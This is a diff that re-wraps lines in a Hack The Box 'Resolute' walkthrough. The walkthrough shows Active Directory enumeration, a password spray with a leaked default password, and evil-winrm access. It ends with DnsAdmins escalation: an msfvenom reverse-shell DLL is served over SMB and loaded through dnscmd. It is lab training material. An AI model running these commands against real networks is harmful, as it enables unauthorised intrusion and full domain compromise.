@@ -9,15 +9,18 @@ An nmap scan of the box reveals that it is likely an AD domain controller with D
 ```bash
 PORT STATE SERVICE VERSION
 53/tcp open domain Simple DNS Plus
-88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-01-07 12:36:09Z)
+88/tcp open kerberos-sec Microsoft Windows Kerberos 
 135/tcp open msrpc Microsoft Windows RPC
 139/tcp open netbios-ssn Microsoft Windows netbios-ssn
-389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
-445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+389/tcp open ldap Microsoft Windows Active Directory LDAP 
+    (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp open microsoft-ds Windows Server 2016 Standard 14393 
+    microsoft-ds (workgroup: MEGABANK)
 464/tcp open kpasswd5?
 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0
 636/tcp open tcpwrapped
-3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3268/tcp open ldap Microsoft Windows Active Directory LDAP 
+    (Domain: megabank.local, Site: Default-First-Site-Name)
 3269/tcp open tcpwrapped
 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
 |_http-server-header: Microsoft-HTTPAPI/2.0
@@ -117,11 +120,16 @@ Back to rpcclient, we can use querydispinfo to get more information about the us
 ```bash
 rpcclient $> querydispinfo
 <SNIP>
-index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) Desc: Key Distribution Center Service Account
-index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null) Desc: (null)
-index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak Desc: Account created. Password set to Welcome123!
-index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie Name: (null) Desc: (null)
-index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki Name: (null) Desc: (null)
+index: 0xff4 RID: 0x1f6 acb: 0x00000011 Account: krbtgt Name: (null) 
+    Desc: Key Distribution Center Service Account
+index: 0x10b1 RID: 0x19cb acb: 0x00000010 Account: marcus Name: (null) 
+    Desc: (null)
+index: 0x10a9 RID: 0x457 acb: 0x00000210 Account: marko Name: Marko Novak 
+    Desc: Account created. Password set to Welcome123!
+index: 0x10c0 RID: 0x2775 acb: 0x00000010 Account: melanie Name: (null) 
+    Desc: (null)
+index: 0x10c3 RID: 0x2778 acb: 0x00000010 Account: naoki Name: (null) 
+    Desc: (null)
 <SNIP>
 ```
 
@@ -131,8 +139,10 @@ That gives us a password that was used when accounts were created of Welcome123!
 ┌─[rin@parrot]─[~/boxes/Resolute]
 └──╼ $crackmapexec smb resolute.htb -u ./users.txt -p 'Welcome123!'
 <SNIP>
-SMB 10.129.1.152 445 RESOLUTE [-] megabank.local\per:Welcome123! STATUS_LOGON_FAILURE
-SMB 10.129.1.152 445 RESOLUTE [-] megabank.local\claude:Welcome123! STATUS_LOGON_FAILURE
+SMB 10.129.1.152 445 RESOLUTE [-] megabank.local\per:Welcome123! 
+    STATUS_LOGON_FAILURE
+SMB 10.129.1.152 445 RESOLUTE [-] megabank.local\claude:Welcome123! 
+    STATUS_LOGON_FAILURE
 SMB 10.129.1.152 445 RESOLUTE [+] megabank.local\melanie:Welcome123!
 ```
 
@@ -144,7 +154,11 @@ This gives us a login with the user melanie that we can then use evil-winrm to l
 Evil-WinRM shell v2.3
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\melanie\Documents>
+```
+
 We can now upload winPEAS.exe using evil-winrm's built in feature of uploading files:
+
+```bash
 *Evil-WinRM* PS C:\Users\melanie\Documents> upload winPEAS.exe
 Info: Uploading winPEAS.exe to C:\Users\melanie\Documents\winPEAS.exe
 Data: 629416 bytes of 629416 bytes copied
@@ -193,7 +207,8 @@ objectGUID : 9f2ff7be-f805-491f-aff1-3653653874d7
 SamAccountName : Contractors
 SID : S-1-5-21-1392959593-3013219662-3596683436-1103
 *Evil-WinRM* PS C:\Users\ryan\Desktop> Get-AdGroupMember -Identity Contractors
-distinguishedName : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,DC=megabank,DC=local
+distinguishedName : CN=Ryan Bertrand,OU=Contractors,OU=MegaBank Users,
+    DC=megabank,DC=local
 name : Ryan Bertrand
 objectClass : user
 objectGUID : 848c83e3-6cbe-4d3e-bacf-aa7bd37da691
@@ -207,8 +222,10 @@ The first thing to do is create a DLL with msfvenom. For the time being, this ca
 
 ```bash
 ┌─[rin@parrot]─[~/boxes/Resolute]
-└──╼ $msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.117 LPORT=6001 -f dll > revsh.dll
-[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+└──╼ $msfvenom -a x64 -p windows/x64/shell_reverse_tcp \
+LHOST=10.10.14.117 LPORT=6001 -f dll > revsh.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows 
+    from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of dll file: 5120 bytes
@@ -220,7 +237,8 @@ We can then start an SMB server using Impacket's smbserver.py to make the DLL ac
 ┌─[✗]─[rin@parrot]─[~/boxes/Resolute]
 └──╼ $sudo smbserver.py share $(pwd)
 [sudo] password for oztechmuse:
-Impacket v0.9.23.dev1+20201209.133255.ac307704 - Copyright 2020 SecureAuth Corporation
+Impacket v0.9.23.dev1+20201209.133255.ac307704 - 
+ Copyright 2020 SecureAuth Corporation
 [*] Config file parsed
 [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
@@ -235,7 +253,8 @@ SERVICE_NAME: dns
  SERVICE_EXIT_CODE : 0 (0x0)
  CHECKPOINT : 0x1
  WAIT_HINT : 0x7530
-*Evil-WinRM* PS C:\Users\ryan\Desktop > dnscmd 127.0.0.1 /config /serverlevelplugindll \\10.10.14.117\share\revsh.dll
+*Evil-WinRM* PS C:\Users\ryan\Desktop > dnscmd 127.0.0.1 `
+/config /serverlevelplugindll \\10.10.14.117\share\revsh.dll
 Registry property serverlevelplugindll successfully reset.
 Command completed successfully.
 *Evil-WinRM* PS C:\Users\ryan\Desktop > sc.exe start dns
